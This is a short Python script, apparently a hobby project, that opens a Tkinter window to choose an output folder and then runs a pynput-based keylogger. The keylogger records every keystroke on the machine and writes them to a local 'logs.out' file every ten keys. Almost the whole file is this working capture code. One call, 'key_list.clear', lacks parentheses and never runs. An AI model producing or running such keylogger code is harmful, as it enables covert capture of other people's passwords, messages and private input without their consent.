import _thread as thread
from pynput import keyboard
from tkinter import *
from tkinter import filedialog
import sys
import os

class Gui:
    def __init__(self) -> None:
        self.top = Tk()
        self.home_dir = os.path.expanduser( '~' )
        self.saving_dir = StringVar(self.top, self.home_dir + os.sep + "Documents")

        self.create_widgets()
        self.pack_widgets()

        self.top.mainloop()

    def _run_program(self):
        self.top.destroy()
        Keylogger(self.saving_dir.get()).run()

    def _browse_dir(self):
        self.saving_dir.set(
            filedialog.askdirectory(initialdir=self.saving_dir.get(),
                                    title="Select Log Output Directory"))

    def create_widgets(self):
        self.label = Label(self.top, text="Select directory to save log outuput:")
        self.saving_dir_input = Entry(self.top, 
                                      textvariable=self.saving_dir, width=50, state=DISABLED, disabledbackground="white", disabledforeground="black")
        self.browse = Button(self.top, text="Browse", command=self._browse_dir)
        self.run = Button(self.top, text="Run", command=self._run_program)

    def pack_widgets(self):
        self.label.grid(row=0, column=0, columnspan=3, sticky=W)
        self.saving_dir_input.grid(row=1, column=0)
        self.browse.grid(row=1, column=1)
        self.run.grid(row=1, column=2)


class Keylogger:
    def __init__(self, saving_dir: str) -> None:
        self.log_file = saving_dir + os.sep + "logs.out"
        
        self.key_list = []
        self.count = 0

    def _write_file(self):
        with open(self.log_file, 'w') as key_strokes:
            key_strokes.write("".join(self.key_list))

    def _on_press(self, key):
        if key == keyboard.Key.space:
            key = " "
        if key == keyboard.Key.backspace:
            key = ""
        if key == keyboard.Key.enter:
            key = "\n"

        self.key_list.append(str(key).replace("'", ""))
        self.count+=1
        if self.count >= 10:
            thread.start_new_thread(self._write_file, ())
            self.key_list.clear
            self.count=0

    def run(self):
        try:
            with keyboard.Listener(on_press=self._on_press) as listener:
                listener.join()
        finally:
            self._write_file()
            sys.exit(1)


if __name__ == '__main__':
    Gui()